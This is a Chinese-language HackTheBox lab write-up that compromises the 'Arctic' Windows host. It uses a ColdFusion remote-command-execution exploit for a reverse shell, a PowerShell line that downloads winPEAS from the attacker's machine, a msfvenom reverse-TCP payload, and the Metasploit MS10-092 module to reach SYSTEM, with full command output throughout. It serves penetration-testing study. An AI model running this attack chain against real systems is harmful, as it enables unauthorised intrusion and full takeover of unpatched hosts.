# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Arctic]
└─# nmap -Pn -sV 10.10.10.11 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 10:26 EST
Nmap scan report for 10.10.10.11
Host is up (0.26s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

连个web服务都没有，一下子有点懵。。
8500端口不太常见，尝试在浏览器上打开，非常慢，但是存在一个文件遍历漏洞

```
Index of /

CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ

```

下面路径是一个cms的登录页面
```
http://10.10.10.11:8500/CFIDE/administrator/
```

看title上的cms名字：```ColdFusion```

在谷歌找了几个这个cms的exp，找到了这个[Remote Command Execution](https://www.exploit-db.com/exploits/50057)

下载到本地，修改本地ip和端口

执行攻击：
```
rinting some information for debugging...
lhost: 10.10.14.6
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: 7ed641ce03ea4eaa92aca6d9ef4c60ab.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.11] 49510

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>

```

拿到了初始shell。。

# 提权

传winpea到靶机
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:8000/winPEAS.bat','c:\Users\tolis\Desktop\winPEAS.bat')"
```

根据winpea枚举显示，靶机缺少较多补丁，可能可以利用来提权

```
                                                                                                                                                                                                                                            
"Microsoft Windows Server 2008 R2 Standard "                                                                                                                                                                                                
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                                                                                                                                           
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                                                                                                                                                     
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                                                                                                                                                  
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                                                                                                                                               
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                                                                                                                                                 
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                                                                                                                                              
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                                                                                                                                                   
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                                                                                                                                                 
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                                                                                                                                              
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                                                                                                                                                    
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                                                                                                                                                     
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                                                                                                                                                      
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                                                                                                                                                       
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                                                                                                                                                       
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                                                                                                                                                    
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                                                                                                                                                 
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                                                                                                                                                      
MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                                                                                                                                               
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                                                                                                                                                   
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                                                                                                                                                
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                                                                                                                                                 
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                                                                                                                                             
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                                                                                                                                               
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                                                                                                                                                   
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)   
```

编译一个meterpreter的shell传到靶机，方便我们利用补丁提权:

```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4455 -f exe > shell64.exe```


拿到反弹的session以后，选择```MS10-092```补丁的利用模块

```
msf6 > search MS10-092

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_092_schelevator

```

设置好参数

```
msf6 exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   2                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4466             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008

```

发动攻击
```
msf6 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.6:4466 
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\bHVjZOnFoCage.exe
[*] Creating task: wHs9mNJi8EUp2
[*] SUCCESS: The scheduled task "wHs9mNJi8EUp2" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\wHs9mNJi8EUp2...
[*] Original CRC32: 0xc87307c
[*] Final CRC32: 0xc87307c
[*] Writing our modified content back...
[*] Validating task: wHs9mNJi8EUp2
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] wHs9mNJi8EUp2                            1/1/2022 6:04:00 ��    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "wHs9mNJi8EUp2" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "wHs9mNJi8EUp2" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (200262 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "wHs9mNJi8EUp2".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 3 opened (10.10.14.6:4466 -> 10.10.10.11:49789) at 2021-12-15 03:06:45 -0500
[*] SUCCESS: The scheduled task "wHs9mNJi8EUp2" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

成功提权到```AUTHORITY\SYSTEM```


